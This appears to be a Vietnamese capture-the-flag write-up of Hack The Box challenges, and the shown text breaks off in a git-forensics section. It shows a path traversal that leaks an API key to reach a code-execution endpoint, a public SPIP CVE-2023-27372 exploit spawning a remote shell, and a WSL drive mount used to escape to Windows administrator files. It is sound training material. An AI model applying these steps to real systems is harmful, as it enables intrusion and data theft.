+        return RedirectResponse('/', status_code=302)
+
+    return FileResponse('public/chat.html', media_type='html')
+
+app.mount(&quot;/&quot;, StaticFiles(directory=&quot;public&quot;, html=True), name=&quot;public&quot;)
+
+
+@app.exception_handler(Exception)
+async def universal_exception_handler(request: Request, exc: Exception):
+    return JSONResponse(
+        status_code=500,
+        content={&quot;message&quot;: &quot;An unexpected error occurred.&quot;}
+    )
+
+```
+
+- Trang web có một chức năng chính là chat -&gt; đầu tiên sẽ có menu 3 room chat-&gt; mỗi room chat sẽ giúp `languagemodels` đọc dữ liệu từ từng file md khác nhau mà khuôn mẫu sẽ trả lời các câu trong file đó.
+
+```
+// api.py
+import languagemodels as lm
+from fastapi import APIRouter, Cookie, Response
+from pydantic import BaseModel
+from uuid import uuid4
+from utils import getRepository, evalCode
+from config import Config
+
+lm.config['instruct_model'] = 'LaMini-Flan-T5-248M'
+lm.config['max_tokens'] = 400
+
+router = APIRouter()
+
+class createParams(BaseModel):
+    topic: str
+
+class chatParams(BaseModel):
+    prompt: str
+
+class copilotParams(BaseModel):
+    code: str
+    copilot_key: str
+
+@router.post(&quot;/create&quot;)
+async def createRoom(response: Response, params: createParams):
+    # rate limit room creation
+    if Config.createProgress == False:
+        Config.createProgress = True
+    else:
+        return {&quot;message&quot;: &quot;A room creation is already in progress&quot;}
+
+    # get knowledge repository
+    content = getRepository(params.topic)
+
+    if not content:
+        Config.createProgress = False
+        return {&quot;message&quot;: &quot;Failed to fetch this repository, please try again&quot;}
+
+
+    # clear previous context
+    lm.docs.clear()
+
+    # store the doc
+    lm.store_doc(content)
+
+    # save params
+    Config.roomID = str(uuid4())
+
+    # create session
+    response.status_code = 201
+    response.set_cookie(&quot;room&quot;, Config.roomID)
+
+    # room progress is done
+    Config.createProgress = False
+    return {&quot;room&quot;: Config.roomID, &quot;topic&quot;: params.topic}
+
+@router.post(&quot;/ask&quot;)
+def ask_gpt(response: Response, chatParams: chatParams, room: str = Cookie(None)):
+    if Config.roomID != room:
+        response.status_code = 404
+        return {&quot;message&quot;: &quot;Room does not exist&quot;}
+
+    # get the response
+    context = lm.get_doc_context(chatParams.prompt)
+    context = context.split(&quot;\n&quot;)
+    context = context[0]
+
+    answer = lm.extract_answer(chatParams.prompt, context)
+
+    # return the response
+    return {&quot;answer&quot;: answer}
+
+@router.post(&quot;/copilot/complete_and_run&quot;)
+def copilot_complete_and_run(response: Response, params: copilotParams):
+    if Config.copilot_key != params.copilot_key:
+        response.status_code = 403
+        return {&quot;message&quot;: &quot;Invalid API key&quot;}
+
+    # get code completion
+    completion = lm.code(params.code)
+
+    if not completion.strip():
+        return {&quot;message&quot;: &quot;Failed to get code completion&quot;}
+
+    full_code = params.code + completion.strip()
+
+    # return the response
+    return {&quot;completion&quot;: full_code, &quot;result&quot;: evalCode(full_code)}
+</code></pre><ul>
+<li>Có 3 routes chính trong route <code>/api</code> là /create -&gt;tạo phòng chat; <code>/ask-&gt;chat</code> -&gt; chat với bot; <code>/copilot/complete_and_run</code> -&gt; thực hiện evalCode là tạo 1 file .py với nội dung <code>code</code> sau đó chạy nó và nhận đầu ra -&gt; xóa file .py</li>
+</ul>
+<pre><code>def evalCode(code):
+    output = &quot;&quot;
+    random = uuid.uuid4().hex
+    filename = os.path.join(&quot;uploads/&quot;) + random + &quot;.py&quot;
+    try:
+        with open(filename, &quot;w&quot;) as f:
+            f.write(code)
+
+        output = subprocess.run(
+            [&quot;python3&quot;, filename],
+            timeout=10,
+            capture_output=True,
+            text=True,
+        ).stdout.strip(&quot;\n&quot;)
+
+        cleanup(filename)
+
+        return output
+
+    except Exception as e: # handle any exception
+        print(e, flush=True)
+        cleanup(filename)
+        return False
+</code></pre><ul>
+<li>Vậy thì đây chắc chắn sẽ là endpoint mà ta hướng tới.</li>
+<li>Nhưng trong này lại check compilot_key nằm trong <code>Config</code></li>
+</ul>
+<pre><code>//config.py
+import os
+
+class Config():
+    roomID = None
+    createProgress = False
+    chatProgress = False
+    knowledgePath = f&quot;{os.getcwd()}/repository&quot;
+    copilot_key = &quot;REDACTED_SECRET&quot;
+</code></pre><ul>
+<li>Và key này được random nên khó brute-force được :
+<img src="https://hackmd.io/_uploads/B1nDSCiQ0.png" alt="image"></li>
+<li>Đó là tổng quan chức năng, tiếp theo là vul của web nằm ở việc <code>/create</code> new room</li>
+</ul>
+<pre><code>@router.post(&quot;/create&quot;)
+async def createRoom(response: Response, params: createParams):
+    # rate limit room creation
+    if Config.createProgress == False:
+        Config.createProgress = True
+    else:
+        return {&quot;message&quot;: &quot;A room creation is already in progress&quot;}
+
+    # get knowledge repository
+    content = getRepository(params.topic)
+
+    if not content:
+        Config.createProgress = False
+        return {&quot;message&quot;: &quot;Failed to fetch this repository, please try again&quot;}
+
+
+    # clear previous context
+    lm.docs.clear()
+
+    # store the doc
+    lm.store_doc(content)
+
+    # save params
+    Config.roomID = str(uuid4())
+
+    # create session
+    response.status_code = 201
+    response.set_cookie(&quot;room&quot;, Config.roomID)
+
+    # room progress is done
+    Config.createProgress = False
+    return {&quot;room&quot;: Config.roomID, &quot;topic&quot;: params.topic}
+    
+    /////////////
+    
+    def readFile(path):
+    try:
+        with open(path, 'r') as f:
+            return f.read()
+    except:
+        return None
+
+def getRepository(topic):
+    for suffix in ['', '.md']:
+        repoFile = f&quot;{Config.knowledgePath}/{topic}{suffix}&quot;
+        print(repoFile)
+        if os.path.exists(repoFile):
+            return readFile(repoFile)
+    return None
+</code></pre><ul>
+<li>Có thể thấy phương thức <code>getRepository</code> dính bug <code>path traversal</code> vì dòng <code>for suffix in ['', '.md']: repoFile = f&quot;{Config.knowledgePath}/{topic}{suffix}&quot;</code> nên hiển nhiên ta có thể join vào file <code>../config.py</code> để <code>languagemodels</code> đọc compilot_key</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/ByAXfqFQ0.png" alt="image">
+<img src="https://hackmd.io/_uploads/Byb_K5KXC.png" alt="image"></p>
+<p>Flag: <code>HTB{1nj3c73d_c0n73x7_c0p1l07_3x3cu73_3b0681e37e0b5b219d0c3abd78d04446}</code></p>
+<h2 id="fullpwnsubmerged">FullPwn/Submerged</h2>
+<ul>
+<li>
+<p>Đây là một bài khá khó vì mình mới vừa tìm hiểu làm dạng researching black-box này.</p>
+</li>
+<li>
+<p>Scan các cổng ta thấy có cổng 80(http) đang mở và redirect về domain <code>submerged.htb</code>.</p>
+</li>
+<li>
+<p>Vào trang web không có gì nổi bật cũng không hề call api và để ý có 1 mục nói về tất cả những nội dung đã được chuyển về <code>spip.submerged.htb</code>.</p>
+</li>
+<li>
+<p>Tiếp tục scan dir thì mình thấy có nhiều file có thể truy cập như htaccess.txt vào trong thì mình thấy trang web đang dùng spip template và nó dính <code>CVE-2023-27372</code> RCE được luôn mà, POC khá nhiều trên github clone về chạy thì RCE được.</p>
+</li>
+<li>
+<p>Chall có 2 flag là user flag thì chỉ cần <code>cat /home/matthew/user.txt</code> là được user flag thì đoạn này dễ nên mình cũng không chụp lại.</p>
+</li>
+</ul>
+<h3 id="user-flag">User Flag</h3>
+<p>user flag : <code>HTB{SpIP_Abu53_4_RC3}</code></p>
+<h3 id="root-flag">Root flag</h3>
+<ul>
+<li>Mình chưa học nhiều về leo thang đặc quyền nên khá kém, mãi sau 1 buổi được 1 anh list cho là sudo -l thì matthew có thể access với quyền root mà không cần nhập mật khẩu, mình cứ nghĩ vào /root/root.txt là có root flag nhưng không, mình ngồi mất 3 tiếng để lục tung tất cả các file trong server cả /tmp/cache/,var/etc/,vv.. nhưng vẫn không có.</li>
+<li>Cuối cùng tìm được manh mối:</li>
+</ul>
+<pre><code>$ sudo uname -a
+
+Linux WIN-1EGDT8E0CN3 4.4.0-17763-Microsoft #2268-Microsoft Thu Oct 07 16:36:00 PST 2021 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre><ul>
+<li>
+<p>Thì con linux chạy server này chẳng qua chỉ là wsl của window thôi , root thực chất ở đây là Administrator của window.</p>
+</li>
+<li>
+<p>Bây giờ tìm xem làm sao để access ra ngoài wsl thì mình tìm được cách để mount ổ <code>C:/</code> ở window sang <code>/mnt</code> trên wsl.</p>
+</li>
+</ul>
+<p>Tạo một thư mục tạm để mount:
+sudo mkdir /mnt/temp
+Mount C: vào dir tmp:
+sudo mount -t drvfs C: /mnt/temp</p>
+<ul>
+<li>Lúc này trong /mnt/tmp/ sẽ access được như dưới đây:</li>
+</ul>
+<pre><code>┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/HTBBusi/CVE-2023-27372/CVE-2023-27372-PoC]
+└─$ sudo python3 exploit.py -u http://spip.submerged.htb
+[+] The Target http://spip.submerged.htb is vulnerable
+[!] Spawning interactive shell
+[!] Shell spawned successfully. Ensure to re-type commands in the event they do not provide output.
+$  sudo ls -la /mnt/temp/Users/Administrator/
+
+total 1584
+drwxrwxrwx 1 root root    512 Apr 10 11:55 .
+drwxrwxrwx 1 root root    512 Apr 30 09:31 ..
+drwxrwxrwx 1 root root    512 Nov 29  2022 3D Objects
+drwxrwxrwx 1 root root    512 Apr 29  2020 AppData
+lrwxrwxrwx 1 root root     45 Apr 29  2020 Application Data
+drwxrwxrwx 1 root root    512 Nov 29  2022 Contacts
+lrwxrwxrwx 1 root root     73 Apr 29  2020 Cookies
+drwxrwxrwx 1 root root    512 Apr 27 11:38 Desktop
+drwxrwxrwx 1 root root    512 Nov 29  2022 Documents
+drwxrwxrwx 1 root root    512 Nov 29  2022 Downloads
+drwxrwxrwx 1 root root    512 Nov 29  2022 Favorites
+drwxrwxrwx 1 root root    512 Nov 29  2022 Links
+lrwxrwxrwx 1 root root     43 Apr 29  2020 Local Settings
+drwxrwxrwx 1 root root    512 Nov 29  2022 Music
+lrwxrwxrwx 1 root root     39 Apr 29  2020 My Documents
+-rwxrwxrwx 1 root root 262144 Apr 30 14:08 NTUSER.DAT
+-rwxrwxrwx 1 root root  65536 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TM.blf
+-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000001.regtrans-ms
+-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000002.regtrans-ms
+lrwxrwxrwx 1 root root     81 Apr 29  2020 NetHood
+drwxrwxrwx 1 root root    512 Nov 29  2022 Pictures
+lrwxrwxrwx 1 root root     70 Apr 29  2020 Recent
+drwxrwxrwx 1 root root    512 Nov 29  2022 Saved Games
+drwxrwxrwx 1 root root    512 Nov 29  2022 Searches
+lrwxrwxrwx 1 root root     70 Apr 29  2020 SendTo
+lrwxrwxrwx 1 root root     74 Apr 29  2020 Start Menu
+lrwxrwxrwx 1 root root     73 Apr 29  2020 Templates
+drwxrwxrwx 1 root root    512 Nov 29  2022 Videos
+-rwxrwxrwx 1 root root 143360 Apr 29  2020 ntuser.dat.LOG1
+-rwxrwxrwx 1 root root  99328 Apr 29  2020 ntuser.dat.LOG2
+-rwxrwxrwx 1 root root     20 Apr 29  2020 ntuser.ini
+drwxrwxrwx 1 root root    512 Apr 30 09:40 tasks
+
+$ sudo cat /mnt/temp/Users/Administrator/NTUSER.DAT
+
+$  sudo cat /mnt/temp/Users/Administrator/ntuser.ini
+��
+
+$  sudo ls -la /mnt/temp/Users/Administrator/Cookies/
+
+$  sudo ls -la /mnt/temp/Users/Administrator/Documents/
+
+total 0
+drwxrwxrwx 1 root root 512 Nov 29  2022 .
+drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
+lrwxrwxrwx 1 root root  35 Apr 29  2020 My Music
+lrwxrwxrwx 1 root root  38 Apr 29  2020 My Pictures
+lrwxrwxrwx 1 root root  36 Apr 29  2020 My Videos
+-rwxrwxrwx 1 root root 402 Nov 29  2022 desktop.ini
+
+$ sudo cat /mnt/temp/Users/Administrator/Documents/desktop.ini
+��
+[.ShellClassInfo]
+LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21770
+IconResource=%SystemRoot%\system32\imageres.dll,-112
+IconFile=%SystemRoot%\system32\shell32.dll
+IconIndex=-235
+
+$  sudo ls -la /mnt/temp/Users/Administrator/Documents/My Music/
+
+$ sudo ls -la /mnt/temp/Users/Administrator/Documents/My Pictures
+
+$ sudo ls -la /mnt/temp/Users/Administrator/Documents/My Videos/
+
+$ sudo ls -la /mnt/temp/Users/Administrator/
+
+total 1584
+drwxrwxrwx 1 root root    512 Apr 10 11:55 .
+drwxrwxrwx 1 root root    512 Apr 30 09:31 ..
+drwxrwxrwx 1 root root    512 Nov 29  2022 3D Objects
+drwxrwxrwx 1 root root    512 Apr 29  2020 AppData
+lrwxrwxrwx 1 root root     45 Apr 29  2020 Application Data
+drwxrwxrwx 1 root root    512 Nov 29  2022 Contacts
+lrwxrwxrwx 1 root root     73 Apr 29  2020 Cookies
+drwxrwxrwx 1 root root    512 Apr 27 11:38 Desktop
+drwxrwxrwx 1 root root    512 Nov 29  2022 Documents
+drwxrwxrwx 1 root root    512 Nov 29  2022 Downloads
+drwxrwxrwx 1 root root    512 Nov 29  2022 Favorites
+drwxrwxrwx 1 root root    512 Nov 29  2022 Links
+lrwxrwxrwx 1 root root     43 Apr 29  2020 Local Settings
+drwxrwxrwx 1 root root    512 Nov 29  2022 Music
+lrwxrwxrwx 1 root root     39 Apr 29  2020 My Documents
+-rwxrwxrwx 1 root root 262144 Apr 30 14:08 NTUSER.DAT
+-rwxrwxrwx 1 root root  65536 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TM.blf
+-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000001.regtrans-ms
+-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000002.regtrans-ms
+lrwxrwxrwx 1 root root     81 Apr 29  2020 NetHood
+drwxrwxrwx 1 root root    512 Nov 29  2022 Pictures
+lrwxrwxrwx 1 root root     70 Apr 29  2020 Recent
+drwxrwxrwx 1 root root    512 Nov 29  2022 Saved Games
+drwxrwxrwx 1 root root    512 Nov 29  2022 Searches
+lrwxrwxrwx 1 root root     70 Apr 29  2020 SendTo
+lrwxrwxrwx 1 root root     74 Apr 29  2020 Start Menu
+lrwxrwxrwx 1 root root     73 Apr 29  2020 Templates
+drwxrwxrwx 1 root root    512 Nov 29  2022 Videos
+-rwxrwxrwx 1 root root 143360 Apr 29  2020 ntuser.dat.LOG1
+-rwxrwxrwx 1 root root  99328 Apr 29  2020 ntuser.dat.LOG2
+-rwxrwxrwx 1 root root     20 Apr 29  2020 ntuser.ini
+drwxrwxrwx 1 root root    512 Apr 30 09:40 tasks
+
+$ sudo ls -la /mnt/temp/Users/Administrator/Recent/
+
+$ sudo ls -la /mnt/temp/Users/Administrator/AppData/
+
+total 0
+drwxrwxrwx 1 root root 512 Apr 29  2020 .
+drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
+drwxrwxrwx 1 root root 512 Apr 29  2020 Local
+drwxrwxrwx 1 root root 512 Apr 29  2020 LocalLow
+drwxrwxrwx 1 root root 512 Sep 15  2018 Roaming
+
+$  sudo ls -la /mnt/temp/Users/Administrator/AppData/Local/
+
+total 0
+drwxrwxrwx 1 root root 512 Apr 29  2020 .
+drwxrwxrwx 1 root root 512 Apr 29  2020 ..
+lrwxrwxrwx 1 root root  43 Apr 29  2020 Application Data
+lrwxrwxrwx 1 root root  69 Apr 29  2020 History
+drwxrwxrwx 1 root root 512 Sep 15  2018 Microsoft
+drwxrwxrwx 1 root root 512 Apr 29  2020 PeerDistRepub
+drwxrwxrwx 1 root root 512 Apr 30 13:48 Temp
+lrwxrwxrwx 1 root root  71 Apr 29  2020 Temporary Internet Files
+
+$  sudo ls -la /mnt/temp/Users/Administrator/AppData/Application Data/
+
+$  sudo ls -la /mnt/temp/Users/Administrator/AppData/History/
+
+$  sudo ls -la /mnt/temp/Users/Administrator/Favorites/
+
+total 0
+drwxrwxrwx 1 root root 512 Nov 29  2022 .
+drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
+-rwxrwxrwx 1 root root 402 Nov 29  2022 desktop.ini
+
+$  sudo ls -la /mnt/temp/Users/Administrator/Videos/
+
+total 0
+drwxrwxrwx 1 root root 512 Nov 29  2022 .
+drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
+-rwxrwxrwx 1 root root 504 Nov 29  2022 desktop.ini
+
+$  sudo ls -la /mnt/temp/Users/Administrator/tasks/
+
+total 0
+drwxrwxrwx 1 root root 512 Apr 30 09:40 .
+drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
+-rwxrwxrwx 1 root root  76 Apr 30 11:03 copy_flag.bat
+-rwxrwxrwx 1 root root  74 Apr 26 12:39 startup.bat
+
+$ sudo cat /mnt/temp/Users/Administrator/tasks/copy_flag.bat
+
+type c:\users\matthew\desktop\user.txt | wsl /bin/bash -c &quot;cat &gt; ~/user.txt&quot;
+
+$ cat /home/matthew/user.txt
+
+HTB{SpIP_Abu53_4_RC3}
+$ sudo ls -la /mnt/temp/Users/Administrator/tasks/
+total 0
+drwxrwxrwx 1 root root 512 Apr 30 09:40 .
+drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
+-rwxrwxrwx 1 root root  76 Apr 30 11:03 copy_flag.bat
+-rwxrwxrwx 1 root root  74 Apr 26 12:39 startup.bat
+
+$ sudo cat /mnt/temp/Users/Administrator/tasks/startup.bat
+@echo off
+wsl sudo service nginx start
+wsl sudo service php7.4-fpm start
+$ sudo ls -la /mnt/temp/Users/Administrator/
+total 1584
+drwxrwxrwx 1 root root    512 Apr 10 11:55 .
+drwxrwxrwx 1 root root    512 Apr 30 09:31 ..
+drwxrwxrwx 1 root root    512 Nov 29  2022 3D Objects
+drwxrwxrwx 1 root root    512 Apr 29  2020 AppData
+lrwxrwxrwx 1 root root     45 Apr 29  2020 Application Data
+drwxrwxrwx 1 root root    512 Nov 29  2022 Contacts
+lrwxrwxrwx 1 root root     73 Apr 29  2020 Cookies
+drwxrwxrwx 1 root root    512 Apr 27 11:38 Desktop
+drwxrwxrwx 1 root root    512 Nov 29  2022 Documents
+drwxrwxrwx 1 root root    512 Nov 29  2022 Downloads
+drwxrwxrwx 1 root root    512 Nov 29  2022 Favorites
+drwxrwxrwx 1 root root    512 Nov 29  2022 Links
+lrwxrwxrwx 1 root root     43 Apr 29  2020 Local Settings
+drwxrwxrwx 1 root root    512 Nov 29  2022 Music
+lrwxrwxrwx 1 root root     39 Apr 29  2020 My Documents
+-rwxrwxrwx 1 root root 262144 Apr 30 14:08 NTUSER.DAT
+-rwxrwxrwx 1 root root  65536 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TM.blf
+-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000001.regtrans-ms
+-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000002.regtrans-ms
+lrwxrwxrwx 1 root root     81 Apr 29  2020 NetHood
+drwxrwxrwx 1 root root    512 Nov 29  2022 Pictures
+lrwxrwxrwx 1 root root     70 Apr 29  2020 Recent
+drwxrwxrwx 1 root root    512 Nov 29  2022 Saved Games
+drwxrwxrwx 1 root root    512 Nov 29  2022 Searches
+lrwxrwxrwx 1 root root     70 Apr 29  2020 SendTo
+lrwxrwxrwx 1 root root     74 Apr 29  2020 Start Menu
+lrwxrwxrwx 1 root root     73 Apr 29  2020 Templates
+drwxrwxrwx 1 root root    512 Nov 29  2022 Videos
+-rwxrwxrwx 1 root root 143360 Apr 29  2020 ntuser.dat.LOG1
+-rwxrwxrwx 1 root root  99328 Apr 29  2020 ntuser.dat.LOG2
+-rwxrwxrwx 1 root root     20 Apr 29  2020 ntuser.ini
+drwxrwxrwx 1 root root    512 Apr 30 09:40 tasks
+$ sudo ls -la /mnt/temp/Users/Administrator/Desktop/
+
+total 0
+drwxrwxrwx 1 root root 512 Apr 27 11:38 .
+drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
+-rwxrwxrwx 1 root root 282 Nov 29  2022 desktop.ini
+-rwxrwxrwx 1 root root  25 Apr 27 11:38 root.txt
+
+$ sudo cat /mnt/temp/Users/Administrator/Desktop/root.txt
+
+HTB{Pwn1ng_WsL_4_7h3_W1n}
+$
+</code></pre><p>user flag : <code>HTB{SpIP_Abu53_4_RC3}</code>
+root flag : <code>HTB{Pwn1ng_WsL_4_7h3_W1n}</code></p>
+<h2 id="misczephyr">Misc/Zephyr</h2>
+<ul>
+<li>
+<p>Đây là 1 bài skill git với source rust program + sqlite database.</p>
+</li>
+<li>
+<p>Đề bài tải xuống .git + 2 file mình nêu ở trên.</p>
+</li>
+<li>
+<p>Như yêu cầu là flag sẽ gồm 3 phần.</p>
+</li>
+<li>
+<p>Nhìn sơ qua thì ta có thể check được mã nguồn có 2 branch là <code>main</code> và <code>w4rri0r-changes</code></p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BJ6jmGTXA.png" alt="image"></p>
+<ul>
+<li>Đầu tiên mình sẽ check xem có bao nhiêu commit ở từng nhánh</li>
+</ul>
+<h3 id="nhánh-main">Nhánh main</h3>
+<pre><code>l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git log -p
+commit 1501091a639e565d40a2b3b20df3227e86d72a0e (HEAD -&gt; main)
+Author: w4rri0r &lt;w4rri0r@zephyr.com&gt;
+Date:   Fri May 10 21:02:33 2024 +0100
+
+    Removed Sensitive Info...
+
+diff --git a/database.db b/database.db
+index 6a3a58e..8dab4e5 100644
+Binary files a/database.db and b/database.db differ
+
+commit ae4f456dcfe1e989ce13ca25231ac5df2fc4380d
+Author: w4rri0r &lt;w4rri0r@zephyr.com&gt;
+Date:   Fri May 10 21:00:57 2024 +0100
+
+    Initial Commit
+
+diff --git a/database.db b/database.db
+new file mode 100644
+index 0000000..6a3a58e
+Binary files /dev/null and b/database.db differ
+diff --git a/source.rs b/source.rs
+new file mode 100644
+index 0000000..7ece558
+--- /dev/null
++++ b/source.rs
+@@ -0,0 +1,125 @@
++#[macro_use] extern crate lazy_static;
++use std::io;
++use std::io::Write;
++use std::env;
++use std::sync::Mutex;
++use rusqlite::{Connection};
++
++
++lazy_static! {
++    static ref DB_CONN: Mutex&lt;Connection&gt; = Mutex::new(Connection::open(&quot;database.db&quot;).unwrap());
++}
++
++const MENU: &amp;str = &quot;MI6: Admin Panel\n\n1) Add Users\n2) View Users\n3) Delete Users\n4) Quit&quot;;
++
++fn main() {
++    let admin_password: String = env::var(&quot;ADMIN_PASS&quot;).expect(&quot;Admin Password not set!&quot;);
++
++    print!(&quot;Enter the administrator password: &quot;);
++    io::stdout().flush().unwrap();
++
++    let mut input = String::new();
++    io::stdin()
++        .read_line(&amp;mut input)
++        .expect(&quot;Failed to read password&quot;);
++
++    if input.trim() != admin_password {
++        eprintln!(&quot;Password invalid!&quot;);
++        std::process::exit(-1);
++    }
++
++    input.clear();
++
++    println!(&quot;{}\n&quot;, MENU);
++
++    loop {
++        print!(&quot;&gt; &quot;);
++        io::stdout().flush().unwrap();
++
++        io::stdin()
++            .read_line(&amp;mut input)
++            .expect(&quot;Failed to read line&quot;);
++
++        let number: i32 = input.trim().parse().unwrap_or_else(|_| {
++            eprintln!(&quot;Please enter a valid integer!&quot;);
++            return 5;
++        });
++
++        match number {
++            1 =&gt; add_user(),
++            2 =&gt; view_users(),
++            3 =&gt; delete_user(),
++            4 =&gt; break,
++            _ =&gt; println!(&quot;Invalid choice, please try again!&quot;)
++        }
++    }
++}
++
++fn add_user() {
++    print!(&quot;Username: &quot;);
++    io::stdout().flush().unwrap();
++
++    let mut username = String::new();
++
++    io::stdin()
++        .read_line(&amp;mut username)
++        .expect(&quot;Failed to read line&quot;);
++
++    let username = username.trim();
++
++    print!(&quot;Password: &quot;);
++    io::stdout().flush().unwrap();
++
++    let mut password = String::new();
++
++    io::stdin()
++        .read_line(&amp;mut password)
++        .expect(&quot;Failed to read line&quot;);
++
++    let password = password.trim();
++
++    let conn = DB_CONN.lock().unwrap();
++
++    conn.execute(&quot;INSERT INTO users (username, password) VALUES (?1, ?2);&quot;, &amp;[&amp;username, &amp;password])
++        .expect(&quot;Failed to create user!&quot;);
++}
++
++fn view_users() {
++    let conn = DB_CONN.lock().unwrap();
++    let mut stmt = conn.prepare(&quot;SELECT id, username, password FROM users;&quot;)
++        .expect(&quot;Failed to prepare a statement&quot;);
++    let mut rows = stmt.query([])
++        .expect(&quot;Error getting users&quot;);
++
++    while let Ok(Some(row)) = rows.next() {
++        let id: i32 = row.get::&lt;_, i32&gt;(0).expect(&quot;Parsing ID failed!&quot;);
++        let username: String = row.get::&lt;_, String&gt;(1).expect(&quot;Parsing username failed!&quot;);
++        let password: String = row.get::&lt;_, String&gt;(2).expect(&quot;Parsing password failed!&quot;);
++
++        println!(&quot;ID {}: {}\t{}&quot;, id, username, password);
++    };
++}
++
++fn delete_user() {
++    let conn = DB_CONN.lock().unwrap();
++
++    print!(&quot;Enter ID: &quot;);
++    io::stdout().flush().unwrap();
++
++    let mut input = String::new();
++    io::stdin()
++        .read_line(&amp;mut input)
++        .expect(&quot;Failed to read line&quot;);
++
++    let number: i32 = match input.trim().parse() {
++        Ok(num) =&gt; num,
++        Err(_) =&gt; {
++            eprintln!(&quot;Please enter a valid integer!&quot;);
++            return;
++        }
++    };
++
++    conn.execute(&quot;DELETE FROM users WHERE id=?1;&quot;, &amp;[&amp;number])
++        .expect(&quot;Failed to delete user!&quot;);
++}
++
+(END
+</code></pre><ul>
+<li>Nhìn vào kết quả hiển thị có thể thấy server có 2 commit được author <code>w4rri0r</code> commit đó là</li>
+</ul>
+<ul>
+<li>
+<p>commit ae4f456dcfe1e989ce13ca25231ac5df2fc4380d -&gt; commit initialCommit đây là commit đầu tiên push dự án lên git</p>
+</li>
+<li>
+<p>commit 1501091a639e565d40a2b3b20df3227e86d72a0e (HEAD -&gt; main) -&gt; commit message Removed Sensitive Info&hellip; -&gt; quan sát kĩ có thể thấy là author đã thay đổi một số thông tin trong file <code>database.db</code></p>
+</li>
+</ul>
+<ul>
+<li>
+<p>View qua file <code>database.db</code> hiện tại thì thấy có một bảng users chứa <code>CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT</code></p>
+</li>
+<li>
+<p>Dùng tool view .db online của SQLite database thì không thấy có bất kì dữ liệu nào nằm ở trong bảng lúc này.</p>
+</li>
+<li>
+<p>Có thể vào thẳng trực tiếp .git để xem các file configuration và trạng thái của repo</p>
+</li>
+</ul>
+<pre><code>l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ cd ../
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git$ ls
+COMMIT_EDITMSG  config  description  FETCH_HEAD  HEAD  hooks  index  info  logs  objects  ORIG_HEAD  refs
+</code></pre><ul>
+<li>Trở lại với flow ở trên thì lúc này mình sẽ redo lại các commit trước</li>
+</ul>
+<pre><code>l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git checkout HEAD~0 -- .
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat database.db 
+&gt;�&gt;P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)n�;tableusersusersCREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, pass��rd TEXusersl3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ 
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git checkout HEAD~1 -- .
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat database.db 
+&gt;�&gt;P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)n�;tableusersusersCREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, pass��%adminusersl3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ S
+
+</code></pre><ul>
+<li>
+<p>Có thể thấy lúc này database.db có thêm một bản ghi trong table users <code>adminusers</code></p>
+</li>
+<li>
+<p>Dùng tool view online thì thấy được password của admin là 1 phần đầu của flag.</p>
+</li>
+<li>
+<p>Mình đã check xem trong file source.rs có phần nào của flag không thì không thấy.</p>
+</li>
+</ul>
+<pre><code>l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat source.rs | grep &quot;}&quot;
+use rusqlite::{Connection};
+}
+    }
+    println!(&quot;{}\n&quot;, MENU);
+        });
+        }
+    }
+}
+}
+        println!(&quot;ID {}: {}\t{}&quot;, id, username, password);
+    };
+}
+        }
+    };
+}
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat source.rs
+#[macro_use] extern crate lazy_static;
+use std::io;
+use std::io::Write;
+use std::env;
+use std::sync::Mutex;
+use rusqlite::{Connection};
+
+
+lazy_static! {
+    static ref DB_CONN: Mutex&lt;Connection&gt; = Mutex::new(Connection::open(&quot;database.db&quot;).unwrap());
+}
+
+const MENU: &amp;str = &quot;MI6: Admin Panel\n\n1) Add Users\n2) View Users\n3) Delete Users\n4) Quit&quot;;
+
+fn main() {
+    let admin_password: String = env::var(&quot;ADMIN_PASS&quot;).expect(&quot;Admin Password not set!&quot;);
+
